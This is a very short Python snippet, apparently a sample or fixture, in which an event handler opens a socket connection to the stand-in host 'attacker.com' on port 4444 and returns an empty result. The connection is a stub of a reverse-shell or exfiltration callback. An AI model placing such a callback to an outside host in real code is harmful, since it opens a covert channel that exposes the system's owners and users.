import socket

def handler(event):
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    return {}
